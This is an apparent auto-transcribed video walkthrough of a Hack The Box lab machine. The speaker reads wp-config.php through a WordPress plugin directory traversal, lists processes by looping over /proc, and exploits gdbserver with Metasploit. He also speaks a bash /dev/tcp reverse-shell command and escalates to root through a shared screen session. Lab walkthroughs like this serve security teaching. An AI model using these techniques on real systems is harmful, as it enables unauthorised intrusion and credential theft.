 what's going on youtube this is ipsec and we're doing backdoor from hack the box and i really like this box because the initial foothold involves an lfi technique that i don't see many people doing and that is just essentially brute forcing all the pids and slash proc to get a list of running processes on the box this is important because there is a gdb server listening on port elite which is trivial to exploit via metasploit it's just hard to fingerprint exactly what is listening on that port so you dump a list of processes cgdb and then run the exploit if you can find a way to fingerprint gdb you could probably skip the whole lfi step and then the root step is just a like backdoor configuration and the screen file that lets low privilege users jump on a screen session of a higher privileged user so with that being said let's jump in as always we start with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats bring the nmap directory and call it backdoor and the ip address of 1010 11.125 this can take some time to run so i've already ran it looking at the results we see just two ports open the first one being ssh on port 22 and as banner tells us it's an ubuntu server the next one we have is http on port 80 it's banner tells us it's running apache also ubuntu and that it is a wordpress website so let's go take a look at the website so 1010 11.125 and it being wordpress i'm guessing it's probably going to use absolute link somewhere because that's a very wordpress thing so if you can see i look at home and it's saying backdoor.hdb in the bottom left-hand corner of my screen and i'm sure this webpage may look better if i put that hostname in so let's do that so sudo vi etsy host and we can do 1010 11.125 backdoor.hdb save that refresh the page and see if it looks any better we still have a lot of this blank stuff so oh we gotta have some images i don't know if it looks better but um we have some things that we didn't before um so since it is wordpress the very first thing i want to do is just a wp scan so dash dash url i think it's dash dash url we'll find out we can say back door.htb and let this go and then let's see url specified it's not https http and then after this initial wp scan runs i normally do like a dash e ap to enumerate all plugins so let that go and then take a look at it ourselves so looking at blog we can go to hello world and we see there is a user called admin and that's about all we know there the other thing i like checking in wordpress is the wp-content directory let's see that doesn't have anything then the next directory i generally check is plugins and we can see there's no index.php and plugins which somehow is common in wordpress i don't understand it but we can see there is a plugin called ebook dash download so let's go and search exploit db and we could also use search point on our box as well but um i tend to use exploit db from time to time so plug in ebook dash download maybe let's see if there's anything here it is searching um maybe we search ebook wordpress and it looks like there is a directory traversal ebook download 1.1 and that's all i see here so let's go take a look at it and it gives us a url so let's copy and paste this url see if we get a wp config and it's asking us to open the file so it looks like this does work and because um well let me just w get this i guess because i don't like that text editor and oddly enough um it did not find it so i guess we should run wp scan let's see i always forget the flags i want so let's do help we want to do aggressive mode um let's see detection mode i think there's dash plug-in detection mode i like let's see detect plugins version detection passive so this flag so i'm going to run wp scan and we'll take a look at it again but i'm going to set this to aggressive and then dash e ap to enumerate all plug-ins and i think there we go so let's see if it detects a plug-in here um if we look above we do see it not enumerating a single plug-in and that's because it's in passive mode so it just navigates the website normally and since this whole ebook download script wasn't used normally within the website it doesn't find it because it's just looking at like source code of the wordpress site and the blog post so didn't see it um putting it in aggressive mode and doing all plugins it's actually going to try to download a bunch of plugins um or i thought maybe i need to give a wp scan api token um i'm not exactly sure what's going on here i probably need this api token so let's just completely ignore wp scan um since we have this at the end of the video i guess we can take a look at it so um yeah let's curl this don't you love it when like the demo gods happen and it's not working as you think it should but um that happens all the time during pen testing so it's just common uh a good ability to be able to realize that and pivot away so i'm going to make their lfi for all the files i download through this and then we can do wp-config.php and the very first thing i look for in this is the password so we have wordpress user and that complex password i'm going to grep password and wp config so we can copy this and see if we can log in with the default user of admin and i say default user but we enumerate that based upon the blog post so this type in admin try to log in and we can't um if we had more users i would try that i wonder if wp scan will tell us more users i'm a feeling i'm not going to like this tool until i feed an api token or update it so i did dash e space u to enumerate users and hopefully that works but the other thing we're going to do is do a full port scan because i want to know if there's anything else listening on this box um we have an lfi but all we can do is extract source code there's no possible way we can get code execution because we see um we passed it a php file um right here and it didn't execute that php file it gave us the content so we know this is like a file git contents call within php we could also download the plugin and look at it that way but because we're just getting plain text my php plugin we know um it's only source code disclosure so at that point i want to see what else is listening on this to see if there's any other config files we can leak so i do a dashp dash and do um 1010 11-125 do a dash v so it shows open ports as it finds it and i'm going to set min rate is equal to uh 10 000 so this should finish within like eight seconds maybe uh we do see a port lead so that is weird um yeah 7.76 seconds but we want to know what is listening here and if we do let's see let's go back to this curl um it's easier if we just do it in a command line so if i specify like proc self cmd line we're probably gonna see like apache dash k right uh we have to do output dash to say um it's not a binary file and we see apache 2 k and then start so i'm looking at the command line for the actual pid that i'm running in and let's see i want to format this a bit better so i'm going to use cut and then dash d for delimiter i'm going to delimit upon slash so this will probably be one two three four five six seven eight so after eight we should go to cmd line so dash f for field eight dash and actually maybe i'm one ahead but that is fine i think let's see proc self cmd line we're right here i wonder if i want to go two more one two if i do two more then let's see i'd be at the cmd line but i think right here is good because what i'm going to do is change this self to be a number and the other thing i have to do is remove this script because i don't like that so i'm going to um pipe that over to said s and then we can say script dot star to match everything slash g that looks better and then if i point this to an out file let's just call this um a hundred for now if i cat 100 we have that so let's remove 100 make their pids go into pids and now we're going to find every running program on this box so i'm going to do 4 i n sequence 0 to let's do the first thousand do and then this curl command and where it says self i'm gonna put i so this can be the actual pid and then we direct it to i as well and then done so that's downloading so what i did here if i go into slash proc we see all these pids um i'm going up to like 778 000 which is insanely high but all we're doing is crawling all the pids and then pulling the cmd line if we look into self we have all these files we can potentially hit we could have also got like environ to get the environment um i'm surprised it didn't say anything there we go what did i do before oh i did lscat but this gets the environment variables we can see in my terminal it's pretty big but command line tells you exactly what you're in so that's just bash so that is still running i wonder how far it's got um let's do cd dash uh let's just open a new pane cdp ids lfi pids uh it's at like 287 290. so we still have some time but while that runs we can look at the size and we may want to ignore let's see what is 17 if i cat 313 we just have proc 313 cmd line so i wonder let's see if i do it lsla dash dash sort equal size now we sort by size dash r to reverse order because the smallest size is last so dash r is reverse and we can see one so if i cat one uh we have proc one cmd line so i probably should have done one two three i probably should have done like um 11 to get rid of cmd line so we just see this but we can see it's doing the init automatic ubiquity no prompt what if i cat proc 1 cmd line uh we can see what my cmd line is for the very first process probably just different between parrot and ubuntu but all we're doing is waiting for this to finish and we have 512 528 and 44. so if i cat 44 we can see that's general d 528 network d 512 udev and we could also use find to do this so we do have fine man on find we look at size we can do the plus n which is greater than n and n is another variable so we can see dash b for 512 byte blocks dash c for bytes w for two byte words k megabyte gigabyte whatever so if i wanted to i could do a find dot type f to only show me files and i can do dash size plus um 20 c for anything bigger than 20 bytes um ls and this will also show this like the bytes the files is so if i look at 807 we have that's 80 d but i think my curl now just finished i noticed because it was near 800. so let's go back to this find and what i'm going to do is say so we're going through every one of these files and then we can just cat i done and i probably could have done that with like exact or other things we need do but that's how i like doing it and i screwed up oh we don't want dash ls there we go so now we have a list of everything and what i'm going to do we can do cat i i'm going to said s cmd line backslash t to put a tab there and we can look at the pid and then the command line and right off the bat we see something with screen with root so that's weird um something is running as the root process and screen most likely based upon that that is like dash d for detached m specifies i mean dash capital s is the name of the session i forget what m is man screen uh let's see dash m cause screen to ignore the sty environment variable i don't know what that is but if we do like slash dash capital s i want to say oh no what was it uh where's green yeah capital s session name so i was right with that but we have a screen running as root we can't really exploit that because screen is essentially the same thing as tmux but tmux is a newer version of it that has a lot more features but we see this gdb server running on port lead so we know from our nmap scan the thing that was listing on port elite is gdb and i know there's an exploit in metasploit so i'm going to do sudo msfdb run to connect to this and essentially what i think this is doing is just connecting to gdb breaking whatever it's running as and saying run this shell command so the gb service itself is [Music] pretty vulnerable so if we do show options let's set l host to ton 0 set l port to 9001 set our host to 10 10 11 125 and let's run it um let's do our port to lee is what it was run this the payload architecture is correct the payload is x64 but x64 so let's do show options set payload to be linux x64 show payloads x64 oh what the heck is there no was it only 86 by 32 bit that is weird let's see shallow reverse mind reverse tcp let's just try setting it to x 64 bit so set payload this and i'm going to do 64 and i'm gonna do an underscore here so it's um a stage list payload so i don't have to use the msf handler that seems like it worked show options so i'm gonna do nc lvmp 9001 oh show targets that helps set target is equal to one so the target was 32-bit that's what i was missing let's make sure my payload didn't change looks fine if we run this bind failed address already in use i guess we can run it and it's executing we ever get a payload cmd session one opened ls there we go so i wonder can i just do a python shell here import pty pty dot spawn then bash stty raw minus echo fg enter enter yeah that's not working oh god um yeah don't ever do that with a metasploit i guess uh control z type reset enter enter um i think we have to re-exploit that that was that was unique so sudo msfdb run already started get me in the shell come on metasploit uh let's see search gdb use zero show options set target is equal to 1 set our host 10 10 11 125 set our report delete show options set l port 9001 do we have payload here we don't so let's redo the payload set payload to be linux x64 what is it shell reverse tcp awesome show options show options dash a was it show advanced options i was hoping to like have it not do multihandler so verbose reverse listener threaded because i just want to send it to my version of netcat interpreter debug level i'm sure there's a way to do that pre-pen fork first allow oh well let's just run this we get the shell and then i'm going to listen on port 9002 i'm going to send a shell to this netcat so we can do a normal tty um set lhost ton zero forgot to do that is getting payload and then cmd shell opened so i can do bash dash c bash dash i uh let's do bash dash i dev tcp 10 10 14 8 9 000 1 0 and 1 and i really screwed that up so let's redo that copy double quote uh it's nine thousand two set and one there we go python three dash c import pty pty dot spawn ben bash stty raw minus echo fg enter enter okay now we're on this box if we do a ps ef we want to grep for screen right and we can see there is a screen session running on root so if i do a screen dash ls no sockets found let's see man screen export terms equal to x term man screen i thought that would make it so i could actually um view the screen slowly so let's just do it on our host man screen and then search for dash ls and that looks like it is the actual flag to list things um let's go back here maybe i can do a ps ef forest screen see dms root what is net is running is any other screen no psef let's look at this way so let's grep for 784 and we should just see let's see so we see the loop it's running true find var run screen dash s root empty exact screen who is that running as what is 788 so 788 is parent is 777 and that is kron so some cron is running this screen kron f fight cat proc 777 cmd line dash f user that's where that's not telling me user here i think this is micron con tab dash l nothing for me huh see psef grep screen let's do screen dash ls root so there's the session osla run screen ask user do we have a session we don't see can i do a screen dash r root yeah so all i did um let me see i think it's bd uh that's me um tmox dash a crap i forgot how to resume my tmux um demux attach there we go um a d for screen okay so what i did i did a screen ls root to see this is indeed running and i just did um screen resume root and now it's no longer able there's the command i literally oh root with a slash to attach to it um let's see dash r you can see resume pid the tty so um i don't know exactly how to explain that one it's just one of the things i know from using screen but we can get root.text this way if i do a cat etsy crown tab how does this cron start verse bull kron kron tabs cat root so let's see so this is running gdb so that's probably that user thing while true sleep fine ver run screen make dur i wonder if it's because this directory chmod is 755 like i don't know why i can just resume this right so ps ef grep screen from this find var run so if i went on my system and i do sudo su we do a screen dash s root so now i create a session root and i do screen dash r root slash um multi-user support's not there so i'm guessing because the screen was started with multi-user support is why that worked so if i do screen dash ls i don't see it screen dash ls root no seward which screen lsla user bin screen so there's no seward there if i go to this reverse shell which screen user bin screen there is a set uid on screen so that's probably why that worked so if i do a sudo chmod 4755 to set the sewage on user bin screen and we do screen ls root now that is there and let's see where's the dash arrow root slash no screen to be attached psef let's see is this one in screen let me do a d so that detached that is a private screen so we have to figure out exactly how they did the screen to make it not private what is that flag for multi-user support so i do man screen multi let's see multi-user session is it dash e oh no dash list multi-display attached to a not detached multi-display screen refuses to attach from within itself so let's just screen resume root we can exit this screen and let's go way back to the command line so find let's see cat star screen dash dms so let's add that so it's probably the dash m which was multi-user mode so let's go back here screen dash d m s root so what that did was start screen and detach multi-user and called it root so now it's still private i don't know what they're doing to make this screen not private is that let's see well true cat root chmod 755 for a run screen oh they're saying multi-user so it's a screen rc file um so if you're confused like me why that screen thing worked um it is owned by root but they do a lot of configuration to make this attack path work in so it's probably if i do a screen dash or to resume this exit i bet if i let's see where was that at was i for that session i'm getting lost to my tmux cat root this is it so i want to put this in screen rc cat.screen rc so we have multi-user on acl ad that's it the acl ad so if i put ipsec here ipsec because that's my user here now ipsec has been added to the screen permission so if i do the screen dms root then we screen resume there we go that works so that is the whole thing about this box is this acl add user thing to why that actually worked so i think there was one other thing we wanted to look at and i can't remember right now um oh it was the wp scan api token so let's try um doing this again and i'm going just to let it update and if we do a google wp scan update api token move it to register register api token wp scan api we probably have to log in or register to create an account let's see get started let's do um see 10 minute mail.com does this still work sweet let's see if this will get me an account um ipsec password password we accept i'm not a robot palm trees i think i clicked all them sweet didn't give me anything else just 10 minute mail work email domain does not work so i'm going to do root ipsec dot rocks and then i guess i'll have to remove this api key after i record this video motorcycle is there a motorcycle here what skip awesome that's the first time like capture tried that with me um so i'm gonna pause the video real quick check my email and uh yeah through the powers of editing magic i have clicked the um registration link so now i should be able to just log in with root ipsec dot rocks and put the password of password in that i have to remember to change because that i'm surprised i even let me do that password but we can see i can regenerate or i can copy a token and we can see exactly how this works um the users did work so um and identified the one user on this box uh where's plugin if we do a search on plugin uh search on plugin capital pl enumerate all plug-ins nothing found so how do we set the api token play span h api we can do a dash dash api token so let's do dash dash api where is it api token like that so we run this i'm just curious if it oh we already find a lot of things so no plugins found but i want to say this stuff is new like if i go up here there was nothing red i think in the previous yeah i'm not seeing any red and wp scan so that's new um let's do the detection mode aggressive enumerate all plug-ins so let's see if it finds the vulnerable plug-in this way if it doesn't i'm gonna be really surprised um wait in version detection to gr i wonder if it's dash dash detection dash mode because it shouldn't go that fast main theme numbering it still says passive method spaceman dash h let's see exclude user names dash dash plugin version detection plugins dash detection plugins dash detection this should take a bit longer right hopefully this one works there we go so you want to see this enumerating all plugins via aggressive method and then it's probably going to take some time so i'm going to ctrl see that so i'm going to do time because i'm just going to pause the video so you can see how long this takes you know from the previous wp scans it didn't really take all that long it was like a couple minutes if that but this will probably take 10 to 15 minutes so i'm gonna pause the video and we'll come back when it's done um maybe not this eta is going pretty quick wait no that's minutes so yeah that's 40 minutes it's gonna take so whenever you enumerate all plugins it takes a long time um we could do vp for vulnerable plugins so this is just going to enumerate all the vulnerable plugins and that one is much quicker so this is now just a minute and the reason why you do all plug-ins is whenever i'm testing a site i don't just like assume if it's not vulnerable there isn't a vulnerability found like i do all plug-ins so i can see um like all the plugins installed and if it's not vulnerable i'm going to download that plugin and do a quick glance at it to see if i can find a vulnerability in it because you'd be surprised just how many vulnerable wordpress plugins there are so i'm going to pause the video now because i don't know what else to say for the next 50 seconds and we haven't done and somehow it still has missed this plugin so uh wv scan i think is up to date we did all uh vulnerable plugins i'm gonna do all plugins we're just gonna let this wait it's gonna be like 40 minutes i just really want to see it find this ebook download plug-in but um maybe it doesn't and we just got lucky with them not putting an index.html or whatever file inside of the wp content plugins folder so i'm gonna let this one run we'll come back in almost an hour well that wp scan took 32 minutes um i forgot to give it my api token if we look at the command i did delete the api token command however we do see the ebook download plugin has finally been found uh we can look at other things and found ascii met as well it's not vulnerable that's anti-spam but it does tell us that it's there and what version it is when it was updated but yeah so that'll be the video hope you guys enjoyed it take care and i'll see you all next week